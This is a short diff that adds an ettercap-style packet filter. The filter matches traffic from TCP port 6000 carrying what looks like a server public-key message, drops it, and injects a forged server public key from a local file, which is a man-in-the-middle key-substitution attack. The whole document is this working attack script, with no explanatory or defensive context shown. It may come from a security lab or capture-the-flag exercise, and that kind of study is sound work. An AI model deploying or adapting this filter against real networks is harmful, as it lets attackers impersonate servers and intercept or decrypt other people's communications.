@@ -1,0 +1,5 @@
+if (tcp.src == 6000 && pcre_regex(DATA.data, "^10001:[a-fA-F0-9]+\xff$")) {
+		msg("Replacing server's public key");
+		drop();
+		inject("packets/fake_server_pubkey_packet");
+}
